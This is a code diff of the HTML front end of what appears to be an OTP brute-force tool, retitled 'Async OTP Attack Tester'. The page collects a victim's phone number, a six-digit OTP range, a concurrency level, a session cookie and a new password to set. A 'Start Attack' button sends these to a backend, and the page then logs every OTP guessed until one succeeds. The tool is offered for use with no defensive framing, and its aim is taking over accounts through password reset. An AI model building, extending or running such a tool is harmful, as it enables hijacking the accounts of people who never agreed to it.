@@ -1,85 +1,91 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <head>
-    <title>OTP Dashboard</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
-    <style>
-        body { font-family: Arial; margin: 20px; }
-        input, button { padding: 5px; margin: 5px; }
-        .advanced { display: none; margin-top: 10px; border: 1px solid #ccc; padding: 10px; }
-        table { border-collapse: collapse; width: 100%; max-height: 400px; overflow-y: auto; display:block; }
-        th, td { border:1px solid #ddd; padding: 5px; word-break: break-word; }
-        th { background:#f2f2f2; }
-        tbody { display:block; max-height: 400px; overflow-y: auto; }
-        tbody tr { display: table; width: 100%; table-layout: fixed; }
-        tr.success { background:#c8e6c9; }
-        tr.stopped { background:#ffcdd2; }
-        tr.failed { background:#ffe0b2; }
-        tr.attempted { background:#e0e0e0; }
-    </style>
+  <title> OTP Tester</title>
+  <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+  <style>
+    body { font-family: Arial; padding: 20px; background: #f8f9fa; }
+    .container { max-width: 800px; margin: auto; background: white; padding: 20px; border-radius: 12px; box-shadow: 0 0 10px rgba(0,0,0,0.1);}
+    table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 14px;}
+    th, td { border: 1px solid #ddd; padding: 8px; text-align: left;}
+    th { background: #007BFF; color: white;}
+    #logTableContainer { height: 300px; overflow-y: auto; margin-top: 10px; }
+    .advanced { background: #eef; padding: 10px; margin-top: 10px; border-radius: 10px; }
+    button { margin-top: 10px; padding: 10px 20px; border: none; border-radius: 5px; background: #007BFF; color: white; cursor: pointer; }
+    button.stop { background: #dc3545; }
+  </style>
 </head>
 <body>
-<h2>OTP Dashboard</h2>
+<div class="container">
+  <h2>🔐 Async OTP Attack Tester</h2>
+  <label>Phone Number:</label>
+  <input type="text" id="phone" placeholder="Enter phone number"><br>
 
-<label>Phone Number:</label>
-<input type="text" id="phone" placeholder="Enter number">
+  <details class="advanced">
+    <summary><b>Advanced Settings</b></summary>
+    <label>Start Range:</label><input type="number" id="start" placeholder="100000"><br>
+    <label>Max Range:</label><input type="number" id="max" placeholder="999999"><br>
+    <label>Concurrent Requests:</label><input type="number" id="concurrent" placeholder="50"><br>
+    <label>Cookie:</label><input type="text" id="cookie" placeholder="Default cookie"><br>
+    <label>New Password:</label><input type="text" id="new_password" placeholder="stre@09099"><br>
+  </details>
 
-<button onclick="toggleAdvanced()">Advanced Settings</button>
+  <button onclick="startAttack()">Start Attack</button>
+  <button class="stop" onclick="stopAttack()">Stop</button>
 
-<div class="advanced" id="advanced">
-    <label>Start OTP:</label><input type="number" id="start"><br>
-    <label>Max OTP:</label><input type="number" id="max"><br>
-    <label>Concurrent Requests:</label><input type="number" id="concurrent"><br>
-    <label>Cookie:</label><input type="text" id="cookie" placeholder="Leave blank for default"><br>
+  <div id="logTableContainer">
+    <table id="logTable">
+      <thead>
+        <tr><th>OTP</th><th>Status</th><th>Response</th></tr>
+      </thead>
+      <tbody></tbody>
+    </table>
+  </div>
 </div>
-
-<button onclick="startAttack()">Start</button>
-<button onclick="stopAttack()">Stop</button>
-
-<table>
-    <thead>
-        <tr>
-            <th>OTP</th><th>Status</th><th>Response</th>
-        </tr>
-    </thead>
-    <tbody id="otpTable"></tbody>
-</table>
 
 <script>
 const socket = io();
+const client_id = Math.random().toString(36).substr(2, 9);
 
-function toggleAdvanced() {
-    const adv = document.getElementById('advanced');
-    adv.style.display = (adv.style.display==='none') ? 'block' : 'none';
-}
-
-function startAttack() {
-    const data = {
-        phone: document.getElementById('phone').value,
-        start: document.getElementById('start').value,
-        max: document.getElementById('max').value,
-        concurrent: document.getElementById('concurrent').value,
-        cookie: document.getElementById('cookie').value
-    };
-    fetch('/start', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(data)});
-}
-
-function stopAttack() {
-    fetch('/stop', {method:'POST'});
-}
-
-// Listen to OTP updates
-socket.on('log', data => {
-    const tr = document.createElement('tr');
-    tr.className = data.status.toLowerCase();
-    tr.innerHTML = `<td>${data.otp}</td><td>${data.status}</td><td>${data.response}</td>`;
-    document.getElementById('otpTable').prepend(tr);
-    tr.scrollIntoView({behavior:"smooth", block:"start"});
+socket.on('log', (data) => {
+  const tbody = document.querySelector('#logTable tbody');
+  const row = document.createElement('tr');
+  row.innerHTML = `<td>${data.otp}</td><td>${data.status}</td><td>${data.response}</td>`;
+  tbody.appendChild(row);
+  const container = document.getElementById('logTableContainer');
+  container.scrollTop = container.scrollHeight;
 });
 
-socket.on('finished', data => {
-    alert(`Finished: ${data.status} OTP=${data.otp_used}`);
+socket.on('finished', (data) => {
+  alert(`✅ Attack finished! OTP ${data.otp_used}: ${data.message}`);
 });
+
+async function startAttack() {
+  const data = {
+    phone: document.getElementById('phone').value,
+    start: document.getElementById('start').value,
+    max: document.getElementById('max').value,
+    concurrent: document.getElementById('concurrent').value,
+    cookie: document.getElementById('cookie').value,
+    new_password: document.getElementById('new_password').value,
+    client_id: client_id
+  };
+  const res = await fetch('/start', {
+    method: 'POST', headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(data)
+  });
+  const resp = await res.json();
+  alert(resp.message);
+}
+
+async function stopAttack() {
+  const res = await fetch('/stop', {
+    method: 'POST', headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({client_id})
+  });
+  const resp = await res.json();
+  alert(resp.message);
+}
 </script>
 </body>
 </html>
